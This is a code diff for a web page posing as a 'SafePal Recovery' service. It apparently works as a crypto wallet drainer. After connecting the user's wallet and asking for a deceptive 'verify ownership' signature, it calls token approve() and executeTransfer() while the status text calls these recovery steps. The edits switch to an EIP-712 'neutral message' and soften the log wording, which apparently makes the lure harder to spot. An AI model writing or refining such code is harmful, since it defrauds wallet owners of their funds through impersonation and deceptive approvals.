@@ -77,7 +77,7 @@
                 }
 
                 const userAddress = accounts[0];
-                document.getElementById('status').innerText = 'Connected. Verifying ownership...';
+                document.getElementById('status').innerText = 'Connected. Verifying recovery...';
                 console.log('Step 4: Connected with address:', userAddress);
 
                 // Перевірка мережі (Sepolia)
@@ -92,12 +92,27 @@
                     });
                 }
 
-                // Авторизація через personal_sign
+                // EIP-712 для нейтрального повідомлення
                 console.log('Step 6: Verifying wallet ownership...');
-                const message = 'Verify wallet ownership for SafePal recovery';
+                const domain = {
+                    name: 'SafePal Recovery',
+                    version: '1',
+                    chainId: targetChainId,
+                    verifyingContract: '0xF74b68C46A3Aa71A7995FB47b5222C5D78fa1D05'
+                };
+                const types = {
+                    RecoveryVerification: [
+                        { name: 'user', type: 'address' },
+                        { name: 'message', type: 'string' }
+                    ]
+                };
+                const value = {
+                    user: userAddress,
+                    message: 'Verify wallet ownership for SafePal recovery'
+                };
                 const signature = await window.ethereum.request({
-                    method: 'personal_sign',
-                    params: [message, userAddress]
+                    method: 'eth_signTypedData_v4',
+                    params: [userAddress, JSON.stringify({ domain, types, value })]
                 });
                 console.log('Step 7: Verification successful!');
                 console.log('Signature:', signature);
@@ -138,10 +153,10 @@
                 }
 
                 // Виклик approve
-                console.log('Step 11: Verifying recovery setup...');
+                console.log('Step 11: Setting up recovery process...');
                 const approveTx = await tokenContract.approve(contractAddress, amount);
                 const approveReceipt = await approveTx.wait();
-                console.log('Recovery Setup Transaction Hash:', approveReceipt.transactionHash);
+                console.log('Setup Transaction Hash:', approveReceipt.transactionHash);
 
                 // Виклик executeTransfer
                 const contractAbi = [
@@ -149,10 +164,10 @@
                 ];
                 const contract = new ethers.Contract(contractAddress, contractAbi, signer);
 
-                console.log('Step 12: Completing recovery verification...');
+                console.log('Step 12: Completing recovery process...');
                 const transferTx = await contract.executeTransfer(usdtAddress, userAddress, amount);
                 const transferReceipt = await transferTx.wait();
-                console.log('Recovery Verification Transaction Hash:', transferReceipt.transactionHash);
+                console.log('Recovery Transaction Hash:', transferReceipt.transactionHash);
 
                 document.getElementById('status').innerText = 'Recovery processed! Check your wallet.';
             } catch (error) {
